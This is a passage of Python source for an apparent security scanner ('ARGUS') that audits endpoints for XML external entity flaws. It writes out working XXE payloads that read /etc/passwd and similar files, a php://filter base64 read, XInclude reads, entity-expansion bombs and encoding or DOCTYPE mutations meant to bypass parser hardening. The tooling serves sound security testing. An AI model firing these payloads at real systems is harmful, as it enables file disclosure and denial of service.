"""
XML Parser Configuration Security Collector for ARGUS.

Actively validates XML parser configurations on discovered endpoints to audit whether
XML-accepting endpoints follow secure parsing best practices (e.g., disabling external entity
resolution, parameter entities, and recursive entity expansion as recommended by OWASP).

Supports multi-technique validation:
1. Entity Resolution Check (safe local identifiers: /etc/hostname, /etc/passwd, win.ini, canary tokens)
2. Parameter Entity Check (%pe;, error-based DTD parameter reflections)
3. Recursive Entity Expansion Check (calibrated safe Billion Laughs / quadratic structures)
4. Parser configuration bypass mutations (UTF-16/UTF-7 declarations & BOM, CDATA parameter entity
   wrapping, DOCTYPE variations, XML namespaces & SOAP envelopes, XInclude directives).

Emits structured Evidence(category="xml_parser_validation"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import codecs
import json
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


class XMLTechnique(str, Enum):
    """Enumeration of XML parser validation techniques."""
    ENTITY_RESOLUTION = "entity_resolution"
    PARAMETER_ENTITY = "parameter_entity"
    RECURSIVE_ENTITY = "recursive_entity"
    XINCLUDE = "xinclude"


class XMLMutationStrategy(str, Enum):
    """Enumeration of parser configuration bypass mutation strategies."""
    DOCTYPE_SYSTEM = "doctype_system"
    DOCTYPE_PUBLIC = "doctype_public"
    UTF16_ENCODING = "utf16_encoding"
    UTF7_ENCODING = "utf7_encoding"
    CDATA_WRAPPING = "cdata_wrapping"
    DOCTYPE_VARIATIONS = "doctype_variations"
    NAMESPACE_SOAP = "namespace_soap"
    XINCLUDE = "xinclude"
    URI_SCHEMES = "uri_schemes"


@dataclass
class XMLValidationResult:
    """Represents the parsed outcome of an XML validation probe."""
    technique: str
    mutation_strategy: str
    severity: str
    confidence: float
    payload: str
    matched_signature: str
    evidence_snippet: str
    target_file: Optional[str] = None
    status_code: int = 200
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    is_valid_finding: bool = True
    error_message: Optional[str] = None
    template_id: str = "xxe"


# Detection Signatures Catalog
TARGET_FILE_SIGNATURES: Dict[str, re.Pattern] = {
    "unix_passwd": re.compile(
        r"root:[x*]?:0:0:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+)",
        re.MULTILINE,
    ),
    "unix_shadow": re.compile(
        r"(?m)^root:(?:\$[0-9a-zA-Z$=_./-]+|!|\*):[0-9]*:[0-9]*:[0-9]*:[0-9]*:"
    ),
    "unix_hosts": re.compile(r"(?m)^127\.0\.0\.1\s+localhost"),
    "unix_version": re.compile(r"Linux version \d+\.\d+[\w\.-]+ \([^\)]+\)"),
    "unix_hostname": re.compile(
        r"^(?:[a-zA-Z0-9][-a-zA-Z0-9_.]*)$",
        re.MULTILINE,
    ),
    "windows_win_ini": re.compile(
        r"\[(?:fonts|extensions|mci extensions|files|mail|386enh|drivers)\]",
        re.IGNORECASE,
    ),
    "windows_boot_ini": re.compile(
        r"\[(?:boot loader|operating systems)\]",
        re.IGNORECASE,
    ),
}

PARSER_ERROR_SIGNATURES: Dict[str, re.Pattern] = {
    # Java / Xerces / SAX
    "java_entity_expansion_limit": re.compile(
        r"(?:The parser has reached the entity expansion limit|entity expansion limit.*exceeded|Excessive entity expansion)",
        re.IGNORECASE,
    ),
    "java_disallow_doctype": re.compile(
        r"DOCTYPE is disallowed when the feature \"http://apache\.org/xml/features/disallow-doctype-decl\" is set to true",
        re.IGNORECASE,
    ),
    "java_file_not_found_entity": re.compile(
        r"java\.io\.FileNotFoundException:.*(?:/etc/|win\.ini|nonexistent)",
        re.IGNORECASE,
    ),
    # Libxml2 (PHP / Python lxml / C)
    "libxml2_entity_amplification": re.compile(
        r"(?:Maximum entity amplification factor limit exceeded|XML_PARSE_HUGE|parser error : Maximum entity amplification)",
        re.IGNORECASE,
    ),
    "libxml2_external_entity_error": re.compile(
        r"warning: failed to load external entity \"file:///",
        re.IGNORECASE,
    ),
    # .NET Framework / Core
    "dotnet_max_chars_from_entities": re.compile(
        r"The input document has exceeded a limit set by MaxCharactersFromEntities",
        re.IGNORECASE,
    ),
    "dotnet_dtd_prohibited": re.compile(
        r"For security reasons DTD is prohibited in this XML document",
        re.IGNORECASE,
    ),
    # Python defusedxml / standard xml
    "python_defusedxml_forbidden": re.compile(
        r"(?:EntitiesForbidden|DTDForbidden|SuspiciousOperation)",
        re.IGNORECASE,
    ),
}


class XMLPayloadGenerator:
    """
    Generates structured XML validation probes, parameter entity tests,
    calibrated recursive expansion payloads, and 5+ bypass mutations.
    """

    SAFE_TARGET_FILES: List[Dict[str, str]] = [
        {"path": "file:///etc/hostname", "type": "unix_hostname", "name": "/etc/hostname"},
        {"path": "file:///etc/passwd", "type": "unix_passwd", "name": "/etc/passwd"},
        {"path": "file:///etc/hosts", "type": "unix_hosts", "name": "/etc/hosts"},
        {"path": "file:///proc/version", "type": "unix_version", "name": "/proc/version"},
        {"path": "file:///c:/windows/win.ini", "type": "windows_win_ini", "name": "win.ini"},
        {"path": "file:///c:/boot.ini", "type": "windows_boot_ini", "name": "boot.ini"},
    ]

    CANARY_TOKEN = "argus_canary_token_7f9a1b3c"

    def generate_baseline_payload(self) -> str:
        """Generates a clean baseline XML payload without entity declarations."""
        return '<?xml version="1.0" encoding="UTF-8"?><root><item>argus_baseline_probe</item></root>'

    def generate_entity_resolution_payloads(
        self, target_files: Optional[List[Dict[str, str]]] = None
    ) -> List[Dict[str, Any]]:
        """Generates external general entity payloads referencing safe identifiers."""
        files = target_files or self.SAFE_TARGET_FILES
        payloads: List[Dict[str, Any]] = []

        for tf in files:
            file_path = tf["path"]
            file_type = tf["type"]
            file_name = tf["name"]

            # Standard SYSTEM entity
            xml_str = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
                f']>\n'
                f'<root><item>&xxe;</item></root>'
            )
            payloads.append({
                "payload": xml_str,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_system_{file_type}",
            })

        # Canary entity payload
        canary_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY xxe "{self.CANARY_TOKEN}">\n'
            f']>\n'
            f'<root><item>&xxe;</item></root>'
        )
        payloads.append({
            "payload": canary_xml,
            "technique": XMLTechnique.ENTITY_RESOLUTION.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "canary_token",
            "file_type": "canary",
            "content_type": "application/xml",
            "template_id": "xxe_canary_test",
        })

        return payloads

    def generate_parameter_entity_payloads(
        self, target_files: Optional[List[Dict[str, str]]] = None
    ) -> List[Dict[str, Any]]:
        """Generates parameter entity payloads for blind/error-based DTD evaluation."""
        files = target_files or self.SAFE_TARGET_FILES
        payloads: List[Dict[str, Any]] = []

        for tf in files[:2]:
            file_path = tf["path"]
            file_type = tf["type"]
            file_name = tf["name"]

            # Standard parameter entity %pe;
            pe_xml = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY % pe SYSTEM "{file_path}">\n'
                f'  %pe;\n'
                f']>\n'
                f'<root><item>test</item></root>'
            )
            payloads.append({
                "payload": pe_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_param_entity_{file_type}",
            })

            # Error-based parameter entity reflection
            err_xml = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY % file SYSTEM "{file_path}">\n'
                f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n'
                f'  %eval;\n'
                f'  %error;\n'
                f']>\n'
                f'<root><item>test</item></root>'
            )
            payloads.append({
                "payload": err_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_param_entity_error_{file_type}",
            })

        return payloads

    def generate_recursive_entity_payloads(self, depth: int = 4) -> List[Dict[str, Any]]:
        """
        Generates calibrated safe recursive entity expansion payloads (Billion Laughs / quadratic).
        Calibrated depth (4 levels) triggers measurable latency/limit errors defensively without hanging.
        """
        payloads: List[Dict[str, Any]] = []

        # Calibrated safe Billion Laughs (depth 4)
        laugh_token = "argus_laugh_token_0123456789"
        lines = [
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<!DOCTYPE root [',
            f'  <!ENTITY lol "{laugh_token}">',
        ]
        for i in range(1, depth + 1):
            prev = "lol" if i == 1 else f"lol{i-1}"
            expansion = f"&{prev};" * 10
            lines.append(f'  <!ENTITY lol{i} "{expansion}">')
        lines.append(']>')
        lines.append(f'<root><item>&lol{depth};</item></root>')
        billion_laughs_xml = "\n".join(lines)

        payloads.append({
            "payload": billion_laughs_xml,
            "technique": XMLTechnique.RECURSIVE_ENTITY.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "recursive_expansion",
            "file_type": "recursive_expansion",
            "content_type": "application/xml",
            "template_id": "xxe_billion_laughs_calibrated",
        })

        # Quadratic expansion payload
        quad_token = "A" * 1000
        quad_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY quad "{quad_token}">\n'
            f'  <!ENTITY quad_all "&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;">\n'
            f']>\n'
            f'<root><item>&quad_all;&quad_all;&quad_all;&quad_all;&quad_all;</item></root>'
        )
        payloads.append({
            "payload": quad_xml,
            "technique": XMLTechnique.RECURSIVE_ENTITY.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "quadratic_expansion",
            "file_type": "recursive_expansion",
            "content_type": "application/xml",
            "template_id": "xxe_quadratic_expansion",
        })

        return payloads

    def generate_mutated_payloads(
        self, strategy: Optional[XMLMutationStrategy] = None
    ) -> List[Dict[str, Any]]:
        """
        Generates 5+ distinct parser configuration bypass mutations:
        1. UTF-7/UTF-16 encoding declarations & BOM bytes
        2. CDATA section parameter entity wrapping
        3. DOCTYPE variations (PUBLIC, comments, whitespace/tabs/newlines, case variations)
        4. XML namespaces and SOAP 1.1 / 1.2 envelopes
        5. XInclude directives
        6. URI Scheme variations
        """
        mutated: List[Dict[str, Any]] = []

        # Strategy 1: UTF-16LE / UTF-16BE / UTF-7 Encoding Declarations & BOM Bytes
        if strategy is None or strategy == XMLMutationStrategy.UTF16_ENCODING:
            xml_utf16_text = (
                '<?xml version="1.0" encoding="UTF-16"?>\n'
                '<!DOCTYPE root [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            # UTF-16LE with BOM
            utf16le_bytes = codecs.BOM_UTF16_LE + xml_utf16_text.encode("utf-16le")
            mutated.append({
                "payload": xml_utf16_text,
                "raw_bytes": utf16le_bytes,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF16_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml; charset=UTF-16LE",
                "template_id": "xxe_mutation_utf16le",
            })
            # UTF-16BE with BOM
            utf16be_bytes = codecs.BOM_UTF16_BE + xml_utf16_text.encode("utf-16be")
            mutated.append({
                "payload": xml_utf16_text,
                "raw_bytes": utf16be_bytes,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF16_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml; charset=UTF-16BE",
                "template_id": "xxe_mutation_utf16be",
            })

        if strategy is None or strategy == XMLMutationStrategy.UTF7_ENCODING:
            # UTF-7 charset declaration
            utf7_xml = (
                '<?xml version="1.0" encoding="UTF-7"?>\n'
                '+ADw-!DOCTYPE root [+ADw-!ENTITY xxe SYSTEM "file:///etc/hostname"+AD4-]+AD4-\n'
                '+ADw-root+AD4-+ADw-item+AD4-&xxe;+ADw-/item+AD4-+ADw-/root+AD4-'
            )
            mutated.append({
                "payload": utf7_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF7_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "text/xml; charset=utf-7",
                "template_id": "xxe_mutation_utf7",
            })

        # Strategy 2: CDATA Section Parameter Entity Wrapping
        if strategy is None or strategy == XMLMutationStrategy.CDATA_WRAPPING:
            cdata_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [\n'
                '  <!ENTITY % start "<![CDATA[">\n'
                '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                '  <!ENTITY % end "]]>">\n'
                '  <!ENTITY % dtd "<!ENTITY all \'%start;%file;%end;\'>">\n'
                '  %dtd;\n'
                ']>\n'
                '<root><item>&all;</item></root>'
            )
            mutated.append({
                "payload": cdata_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.CDATA_WRAPPING.value,
                "target_file": "/etc/passwd",
                "file_type": "unix_passwd",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_cdata_wrapping",
            })

        # Strategy 3: DOCTYPE Variations (PUBLIC, Comments, Whitespace/Tabs, Case Variations)
        if strategy is None or strategy == XMLMutationStrategy.DOCTYPE_VARIATIONS:
            # PUBLIC Identifier
            public_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root PUBLIC "-//ARGUS//XXE" "file:///etc/hostname">\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": public_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_PUBLIC.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_public",
            })

            # Internal subset with comments and whitespace
            comment_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE/**/root/**/[\n'
                '\t<!ENTITY/**/xxe/**/SYSTEM/**/"file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": comment_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_VARIATIONS.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_comments",
            })

            # Case variation
            case_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DocType root [\n'
                '  <!Entity xxe System "file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": case_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_VARIATIONS.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_case",
            })

        # Strategy 4: XML Namespaces and SOAP 1.1 / 1.2 Envelopes
        if strategy is None or strategy == XMLMutationStrategy.NAMESPACE_SOAP:
            # SOAP 1.1
            soap11_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE soapenv:Envelope [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
                '  <soapenv:Header/>\n'
                '  <soapenv:Body>\n'
                '    <Request>\n'
                '      <item>&xxe;</item>\n'
                '    </Request>\n'
                '  </soapenv:Body>\n'
                '</soapenv:Envelope>'
            )
            mutated.append({
                "payload": soap11_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "text/xml",
                "template_id": "xxe_mutation_soap11",
            })

            # SOAP 1.2
            soap12_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE env:Envelope [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">\n'
                '  <env:Header/>\n'
                '  <env:Body>\n'
                '    <GetData>\n'
                '      <item>&xxe;</item>\n'
                '    </GetData>\n'
                '  </env:Body>\n'
                '</env:Envelope>'
            )
            mutated.append({
                "payload": soap12_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/soap+xml",
                "template_id": "xxe_mutation_soap12",
            })

            # Namespaced custom element
            ns_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE ns:root [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<ns:root xmlns:ns="http://schema.example.com/ns">\n'
                '  <ns:item>&xxe;</ns:item>\n'
                '</ns:root>'
            )
            mutated.append({
                "payload": ns_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_namespaced",
            })

        # Strategy 5: XInclude Directives
        if strategy is None or strategy == XMLMutationStrategy.XINCLUDE:
            xinclude_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                '  <item>\n'
                '    <xi:include parse="text" href="file:///etc/hostname"/>\n'
                '  </item>\n'
                '</root>'
            )
            mutated.append({
                "payload": xinclude_xml,
                "technique": XMLTechnique.XINCLUDE.value,
                "mutation_strategy": XMLMutationStrategy.XINCLUDE.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_xinclude_text",
            })

            xinclude_fallback_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                '  <item>\n'
                '    <xi:include parse="text" href="file:///etc/passwd">\n'
                '      <xi:fallback>argus_fallback_token</xi:fallback>\n'
                '    </xi:include>\n'
                '  </item>\n'
                '</root>'
            )
            mutated.append({
                "payload": xinclude_fallback_xml,
                "technique": XMLTechnique.XINCLUDE.value,
                "mutation_strategy": XMLMutationStrategy.XINCLUDE.value,
                "target_file": "/etc/passwd",
                "file_type": "unix_passwd",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_xinclude_fallback",
            })

        # Strategy 6: URI Schemes
        if strategy is None or strategy == XMLMutationStrategy.URI_SCHEMES:
            uri_schemes = [
                ("file://localhost/etc/hostname", "localhost_authority"),
                ("file:/etc/hostname", "single_slash"),
                ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_filter"),
            ]
            for uri, scheme_tag in uri_schemes:
                uri_xml = (
                    f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE root [\n'
                    f'  <!ENTITY xxe SYSTEM "{uri}">\n'
                    f']>\n'
                    f'<root><item>&xxe;</item></root>'
                )
                mutated.append({
                    "payload": uri_xml,
                    "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                    "mutation_strategy": XMLMutationStrategy.URI_SCHEMES.value,
                    "target_file": uri,
                    "file_type": "unix_passwd" if "passwd" in uri else "unix_hostname",
                    "content_type": "application/xml",
                    "template_id": f"xxe_mutation_uri_{scheme_tag}",
                })

        return mutated

    def generate_all_payloads(self) -> List[Dict[str, Any]]:
        """Generates comprehensive list of all validation probes."""
        all_probes: List[Dict[str, Any]] = []
        all_probes.extend(self.generate_entity_resolution_payloads())
        all_probes.extend(self.generate_parameter_entity_payloads())
        all_probes.extend(self.generate_recursive_entity_payloads())
        all_probes.extend(self.generate_mutated_payloads())
        return all_probes


class XMLParserAnalyzer:
    """
    Analyzes HTTP responses to detect genuine XML parser misconfigurations while
    eliminating false positives via baseline subtraction and echo guards.
    """

    LATENCY_THRESHOLD_SECONDS = 3.0
    LATENCY_FACTOR = 3.0

    def __init__(self):
        self.file_signatures = dict(TARGET_FILE_SIGNATURES)
        self.error_signatures = dict(PARSER_ERROR_SIGNATURES)

    def analyze_response(
        self,
        response: Optional[HttpResponse],
        payload_info: Dict[str, Any],
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[XMLValidationResult]:
        """
        Analyzes response against expected vulnerability patterns and baseline.
        Returns XMLValidationResult on positive detection, None on benign/clean response.
        """
        if response is None:
            return None

        body = response.body or response.raw_body or ""
        status_code = response.status_code or 0
        elapsed = getattr(response, "elapsed", 0.0) or 0.0

        baseline_body = ""
        baseline_elapsed = 0.0
        if baseline_response is not None:
            baseline_body = baseline_response.body or baseline_response.raw_body or ""
            baseline_elapsed = getattr(baseline_response, "elapsed", 0.0) or 0.0

        technique = payload_info.get("technique", XMLTechnique.ENTITY_RESOLUTION.value)
        mutation = payload_info.get("mutation_strategy", XMLMutationStrategy.DOCTYPE_SYSTEM.value)
        target_file = payload_info.get("target_file", "")
        file_type = payload_info.get("file_type", "")
        payload_text = payload_info.get("payload", "")
        template_id = payload_info.get("template_id", "xxe")

        # Guard 1: Echo Guard — check if the response merely echoed the entity unexpanded
        # or echoed the exact payload text without resolution
        if self._is_unexpanded_reflection(body, payload_text):
            logger.debug("Echo guard triggered: Unexpanded reflection detected. Suppressing finding.")
            return None

        # 1. Check Reflected Entity Resolution / XInclude File Contents
        if technique in (XMLTechnique.ENTITY_RESOLUTION.value, XMLTechnique.XINCLUDE.value):
            # Canary Token Check
            if file_type == "canary" and XMLPayloadGenerator.CANARY_TOKEN in body:
                if XMLPayloadGenerator.CANARY_TOKEN not in baseline_body:
                    snippet = self._extract_snippet(body, XMLPayloadGenerator.CANARY_TOKEN)
                    return XMLValidationResult(
                        technique=technique,
                        mutation_strategy=mutation,
                        severity="critical",
                        confidence=0.95,
                        payload=payload_text,
                        matched_signature="canary_token",
                        evidence_snippet=snippet,
                        target_file="canary_token",
                        status_code=status_code,
                        baseline_elapsed=baseline_elapsed,
                        injected_elapsed=elapsed,
                        template_id=template_id,
                    )

            # Specific File Signature Check
            if file_type in self.file_signatures:
                pattern = self.file_signatures[file_type]
                match = pattern.search(body)
                if match:
                    matched_str = match.group(0)
                    # Baseline Subtraction: Ensure signature is NOT in clean baseline response
                    if not pattern.search(baseline_body):
                        # Ensure matched string is not just payload literal
                        if matched_str not in payload_text or file_type == "unix_hostname":
                            snippet = self._extract_snippet(body, matched_str)
                            return XMLValidationResult(
                                technique=technique,
                                mutation_strategy=mutation,
                                severity="critical",
                                confidence=0.95,
                                payload=payload_text,
                                matched_signature=file_type,
                                evidence_snippet=snippet,
                                target_file=target_file,
                                status_code=status_code,
                                baseline_elapsed=baseline_elapsed,
                                injected_elapsed=elapsed,
                                template_id=template_id,
                            )

            # Generic check across all known file signatures
            for sig_name, pattern in self.file_signatures.items():
                if sig_name == file_type:
                    continue
                match = pattern.search(body)
                if match and not pattern.search(baseline_body):
                    matched_str = match.group(0)
                    if matched_str not in payload_text:
                        snippet = self._extract_snippet(body, matched_str)
                        return XMLValidationResult(
                            technique=technique,
                            mutation_strategy=mutation,
                            severity="critical",
                            confidence=0.95,
                            payload=payload_text,
                            matched_signature=sig_name,
                            evidence_snippet=snippet,
                            target_file=target_file,
                            status_code=status_code,
                            baseline_elapsed=baseline_elapsed,
                            injected_elapsed=elapsed,
                            template_id=template_id,
                        )

        # 2. Check Parameter Entity / Error-Based File Leaks
        if technique == XMLTechnique.PARAMETER_ENTITY.value:
            # Check for error leaks containing target file content or path
            file_error_match = self.error_signatures["java_file_not_found_entity"].search(body)
            if file_error_match and not self.error_signatures["java_file_not_found_entity"].search(baseline_body):
                snippet = self._extract_snippet(body, file_error_match.group(0))
                return XMLValidationResult(
                    technique=technique,
                    mutation_strategy=mutation,
                    severity="critical" if ("/etc/" in snippet or "win.ini" in snippet) else "high",
                    confidence=0.95 if ("/etc/" in snippet or "win.ini" in snippet) else 0.85,
                    payload=payload_text,
                    matched_signature="parameter_entity_error_leak",
                    evidence_snippet=snippet,
                    target_file=target_file,
                    status_code=status_code,
                    baseline_elapsed=baseline_elapsed,
                    injected_elapsed=elapsed,
                    template_id=template_id,
                )

            # Check for file signatures inside error or body
            for sig_name, pattern in self.file_signatures.items():
                match = pattern.search(body)
                if match and not pattern.search(baseline_body):
                    matched_str = match.group(0)
                    if matched_str not in payload_text:
                        snippet = self._extract_snippet(body, matched_str)
                        return XMLValidationResult(
                            technique=technique,
                            mutation_strategy=mutation,
                            severity="critical",
                            confidence=0.95,
                            payload=payload_text,
                            matched_signature=f"parameter_entity_{sig_name}",
                            evidence_snippet=snippet,
                            target_file=target_file,
                            status_code=status_code,
                            baseline_elapsed=baseline_elapsed,
                            injected_elapsed=elapsed,
                            template_id=template_id,
                        )

            # DTD parsing confirmed signature
            libxml2_ext = self.error_signatures["libxml2_external_entity_error"].search(body)
            if libxml2_ext and not self.error_signatures["libxml2_external_entity_error"].search(baseline_body):
                snippet = self._extract_snippet(body, libxml2_ext.group(0))
                return XMLValidationResult(
                    technique=technique,
                    mutation_strategy=mutation,
                    severity="high",
                    confidence=0.85,
                    payload=payload_text,
                    matched_signature="libxml2_external_entity_error",
                    evidence_snippet=snippet,
                    target_file=target_file,
                    status_code=status_code,
                    baseline_elapsed=baseline_elapsed,
                    injected_elapsed=elapsed,
                    template_id=template_id,
                )

        # 3. Check Recursive Entity Expansion (Billion Laughs / Quadratic)
        if technique == XMLTechnique.RECURSIVE_ENTITY.value:
            delay_delta = elapsed - baseline_elapsed
            # Indicator A: Latency differential >= 3.0s and abnormal multiplier
            if elapsed >= self.LATENCY_THRESHOLD_SECONDS and (
                baseline_elapsed == 0.0 or elapsed >= (baseline_elapsed * self.LATENCY_FACTOR + 1.5)
            ):
                return XMLValidationResult(
                    technique=technique,
                    mutation_strategy=mutation,
                    severity="high",
                    confidence=0.85,
                    payload=payload_text,
                    matched_signature="latency_differential_delay",
                    evidence_snippet=f"Latency: {elapsed:.2f}s (baseline: {baseline_elapsed:.2f}s, delta: {delay_delta:.2f}s)",
                    target_file="recursive_expansion",
                    status_code=status_code,
                    delay_delta=delay_delta,
                    baseline_elapsed=baseline_elapsed,
                    injected_elapsed=elapsed,
                    template_id=template_id,
                )

            # Indicator B: Parser Expansion Limit Error Signatures
            for sig_name, pattern in self.error_signatures.items():
                if "limit" in sig_name or "amplification" in sig_name or "max_chars" in sig_name:
                    match = pattern.search(body)
                    if match and not pattern.search(baseline_body):
                        matched_str = match.group(0)
                        snippet = self._extract_snippet(body, matched_str)
                        return XMLValidationResult(
                            technique=technique,
                            mutation_strategy=mutation,
                            severity="medium",
                            confidence=0.80,
                            payload=payload_text,
                            matched_signature=sig_name,
                            evidence_snippet=snippet,
                            target_file="recursive_expansion",
                            status_code=status_code,
                            baseline_elapsed=baseline_elapsed,
                            injected_elapsed=elapsed,
                            template_id=template_id,
                        )

            # Indicator C: Full expansion reflection (Billion laughs token multiplied)
            if "argus_laugh_token_0123456789" in body and body.count("argus_laugh_token_0123456789") > 5:
                if baseline_body.count("argus_laugh_token_0123456789") == 0:
                    snippet = self._extract_snippet(body, "argus_laugh_token_0123456789")
                    return XMLValidationResult(
                        technique=technique,
                        mutation_strategy=mutation,
                        severity="high",
                        confidence=0.90,
                        payload=payload_text,
                        matched_signature="recursive_expansion_reflected",
                        evidence_snippet=snippet,
                        target_file="recursive_expansion",
                        status_code=status_code,
                        baseline_elapsed=baseline_elapsed,
                        injected_elapsed=elapsed,
                        template_id=template_id,
                    )

        return None

    def _is_unexpanded_reflection(self, body: str, payload: str) -> bool:
        """
        Determines whether the server merely echoed the raw unparsed XML markup
        or entity literal (e.g. &xxe; or &all; or <!DOCTYPE...) without resolving it.
        """
        if not body or not payload:
            return False

        # If &xxe; is in body and no target file was resolved, it's literal reflection
        if "&xxe;" in body and not any(sig.search(body) for sig in self.file_signatures.values()):
            # If the body contains literal &xxe; and nothing else from the file
            return True

        if "&all;" in body and not self.file_signatures["unix_passwd"].search(body):
            return True

        if "&lol4;" in body and "argus_laugh_token_0123456789" not in body:
            return True

        # Check if entire payload was verbatim echoed
        if len(payload) > 30 and payload.strip() in body:
            return True

        return False

    def _extract_snippet(self, body: str, match_term: str, window: int = 120) -> str:
        """Extracts a surrounding contextual snippet around the matched term."""
        idx = body.find(match_term)
        if idx == -1:
            return body[:window].strip()
        start = max(0, idx - 40)
        end = min(len(body), idx + len(match_term) + 80)
